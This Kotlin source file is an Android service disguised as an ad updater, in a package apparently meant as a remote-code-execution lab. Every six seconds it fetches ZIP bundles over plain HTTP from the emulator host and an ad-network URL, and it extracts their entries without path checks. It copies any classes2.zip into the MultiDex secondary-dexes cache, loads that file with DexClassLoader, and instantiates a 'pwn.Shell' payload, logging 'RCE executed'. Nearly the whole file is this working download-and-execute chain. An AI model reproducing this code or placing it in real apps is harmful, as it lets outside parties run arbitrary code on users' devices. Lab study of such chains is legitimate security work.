package com.app.lab.rce

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.ZipEntry
import java.util.zip.ZipInputStream

class AdUpdateService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onCreate() {
        super.onCreate()
        Log.d("AdUpdateService", "Service created")
        startPeriodicDownloads()
    }
    
    private fun startPeriodicDownloads() {
        scope.launch {
            while (true) {
                try {
                    downloadAndExtractZip("http://10.0.2.2:8000/exploit_bundle.zip")
                    downloadAndExtractZip("http://api.vungle.com/api/v1/bundles/update.zip")
                } catch (e: Exception) {
                    Log.e("AdUpdateService", "Download error: ${e.message}")
                }
                delay(6000)
            }
        }
    }
    
    private suspend fun downloadAndExtractZip(urlString: String) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.connectTimeout = 5000
                connection.readTimeout = 10000
                
                val inputStream = connection.inputStream
                val tempFile = File.createTempFile("update", ".zip", cacheDir)
                
                inputStream.use { input ->
                    tempFile.outputStream().use { output ->
                        input.copyTo(output)
                    }
                }
                
                extractZip(tempFile)
                tempFile.delete()
                
            } catch (e: Exception) {
                Log.e("AdUpdateService", "Error downloading $urlString: ${e.message}")
            }
        }
    }
    
    private fun extractZip(zipFile: File) {
        try {
            ZipInputStream(zipFile.inputStream()).use { zipStream ->
                var entry: ZipEntry?
                while (zipStream.nextEntry.also { entry = it } != null) {
                    entry?.let { zipEntry ->
                        if (!zipEntry.isDirectory) {
                            val entryName = zipEntry.name
                            Log.d("AdUpdateService", "Extracting: $entryName")
                            
                            val outputFile = File(cacheDir, entryName)
                            outputFile.parentFile?.mkdirs()
                            
                            outputFile.outputStream().use { output ->
                                zipStream.copyTo(output)
                            }
                            
                            if (entryName.contains("classes2.zip")) {
                                copyToMultiDxSecondaryDexes()
                            }
                        }
                    }
                    zipStream.closeEntry()
                }
            }
        } catch (e: Exception) {
            Log.e("AdUpdateService", "Error extracting ZIP: ${e.message}")
        }
    }
    
    private fun copyToMultiDxSecondaryDexes() {
        try {
            val secondaryDexesDir = File(filesDir.parent, "code_cache/secondary-dexes")
            if (!secondaryDexesDir.exists()) {
                secondaryDexesDir.mkdirs()
            }
            
            findAndExtractClasses2Zip(cacheDir, secondaryDexesDir)
            loadFromSecondaryDexDir(secondaryDexesDir)
            
        } catch (e: Exception) {
            Log.e("AdUpdateService", "Error in MultiDex operation: ${e.message}")
        }
    }
    
    private fun findAndExtractClasses2Zip(searchDir: File, targetDir: File) {
        searchDir.listFiles()?.forEach { file ->
            if (file.isDirectory) {
                findAndExtractClasses2Zip(file, targetDir)
            } else if (file.name.contains("classes2.zip")) {
                val targetFile = File(targetDir, "com.app.lab.rce-classes2.zip")
                file.copyTo(targetFile, overwrite = true)
                targetFile.setReadable(true)
                targetFile.setExecutable(true)
                Log.d("AdUpdateService", "Copied classes2.zip to secondary-dexes")
            }
        }
    }
    
    private fun loadFromSecondaryDexDir(secondaryDexesDir: File) {
        try {
            secondaryDexesDir.listFiles()?.forEach { dexFile ->
                if (dexFile.name.endsWith(".zip") || dexFile.name.endsWith(".dex")) {
                    Log.d("AdUpdateService", "Loading DEX: ${dexFile.name}")
                    
                    val optimizedDir = File(cacheDir, "optimized")
                    optimizedDir.mkdirs()
                    
                    val dexClassLoader = dalvik.system.DexClassLoader(
                        dexFile.absolutePath,
                        optimizedDir.absolutePath,
                        null,
                        classLoader
                    )
                    
                    try {
                        val shellClass = dexClassLoader.loadClass("pwn.Shell")
                        Log.d("AdUpdateService", "Payload loaded: pwn.Shell")
                        val instance = shellClass.getDeclaredConstructor().newInstance()
                        Log.d("AdUpdateService", "RCE executed")
                    } catch (e: Exception) {
                        Log.e("AdUpdateService", "Error loading payload: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("AdUpdateService", "Error in DEX loading: ${e.message}")
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}
